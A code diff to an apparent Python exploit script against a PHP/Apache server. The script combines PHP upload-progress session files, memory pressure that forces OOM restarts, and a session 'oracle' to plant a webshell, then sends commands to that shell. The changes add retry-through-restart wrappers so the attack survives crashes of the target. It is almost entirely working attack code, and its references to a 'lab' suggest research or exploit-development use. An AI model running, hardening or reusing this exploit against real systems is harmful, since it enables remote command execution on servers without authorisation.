@@ -177,6 +177,37 @@ def oracle(host: str, port: int, sid: str) -> dict:
     return rep
 
 
+def oracle_stable(host: str, port: int, sid: str,
+                  tries: int = 12) -> dict:
+    """Read the session report, waiting through a target restart.
+
+    The session file lives on disk and survives any process death (the
+    OOM may also select the apache master). When the target is restarting
+    at the moment we ask, wait for it and re-read instead of throwing the
+    whole attempt - and its mixed state - away.
+    """
+    for _ in range(tries):
+        try:
+            return oracle(host, port, sid)
+        except OSError:
+            time.sleep(0.75)
+    return {"raw": "target never came back", "dead": True}
+
+
+def http_get_retry(host: str, port: int, path: str, sid: str | None = None,
+                   tries: int = 8) -> bytes:
+    """GET with wait-through-restart (for the webshell probe: the shell
+    file is on disk too, so a restarting target only needs a moment)."""
+    last = b""
+    for _ in range(tries):
+        try:
+            return http_get(host, port, path, sid=sid)
+        except OSError as e:
+            last = type(e).__name__.encode()
+            time.sleep(0.75)
+    return last
+
+
 # --------------------------------------------------------------- attempt
 
 def build_payload() -> bytes:
@@ -230,7 +261,11 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
     res = {"h": h}
     # pool hygiene: drop every stored session file so only this attempt's
     # C contributes page cache (missing endpoint = no-op on real targets).
-    http_get(host, port, "/index.php?gc=1")
+    # Best-effort: a target that is restarting here is handled below.
+    try:
+        http_get(host, port, "/index.php?gc=1")
+    except OSError:
+        pass
 
     sid = lab.sid_new()
     res["sid"] = sid
@@ -247,7 +282,7 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
                 pass
         carrier, _ = lab.carrier_hold(sid)
         time.sleep(0.7)
-        rep = oracle(host, port, sid)
+        rep = oracle_stable(host, port, sid)
         if any(str(k).startswith("upload_progress_")
                for k in (rep.get("keys") or [])):
             break
@@ -273,7 +308,7 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
     res["victim"] = ev
     res["drop_ms"] = round(drop_ms, 1)
 
-    rep = oracle(host, port, sid)
+    rep = oracle_stable(host, port, sid)
     outcome, k = classify(rep, c_len, r_len)
     res["outcome"] = outcome
     res["k"] = k
@@ -282,8 +317,9 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
     hit = outcome == "hit"
     res["hit"] = hit
     if hit:
-        cmd_out = http_get(host, port,
-                           f"{SHELL}?c={urllib.parse.quote(res.get('cmd', 'id'))}")
+        cmd_out = http_get_retry(host, port,
+                                 f"{SHELL}?c="
+                                 f"{urllib.parse.quote(res.get('cmd', 'id'))}")
         res["output"] = cmd_out.decode(errors="replace")
 
     # Release the pressure BEFORE reading the oracle: the consumer has to
@@ -296,14 +332,15 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
             s.close()
         except OSError:
             pass
-    rep2 = oracle(host, port, sid) if outcome == "oracle-failed" else rep
+    rep2 = (oracle_stable(host, port, sid)
+            if outcome == "oracle-failed" else rep)
     if outcome == "oracle-failed":
         res["outcome"], k = classify(rep2, c_len, r_len)
         res["k"] = k
         res["hit"] = res["outcome"] == "hit"
         if res["hit"]:
-            cmd_out = http_get(host, port, f"{SHELL}?c="
-                               f"{urllib.parse.quote(res.get('cmd', 'id'))}")
+            cmd_out = http_get_retry(host, port, f"{SHELL}?c="
+                                     f"{urllib.parse.quote(res.get('cmd', 'id'))}")
             res["output"] = cmd_out.decode(errors="replace")
 
     for s in [carrier, victim]:
@@ -354,7 +391,16 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     for i in range(1, max_attempts + 1):
         if not wait_server(host, port):
             return {"error": "server unreachable"}
-        res = attempt(host, port, h, c_len, r_len)
+        try:
+            res = attempt(host, port, h, c_len, r_len)
+        except OSError as e:
+            # Transient connection loss (e.g. the target is restarting after
+            # an OOM): wait for it to come back and retry instead of dying.
+            if verbose:
+                print(f"    attempt {i}: connection error "
+                      f"({type(e).__name__}) - waiting for target")
+            wait_server(host, port, timeout=30)
+            continue
         res["cmd"] = command
         if res.get("hit"):
             if verbose:
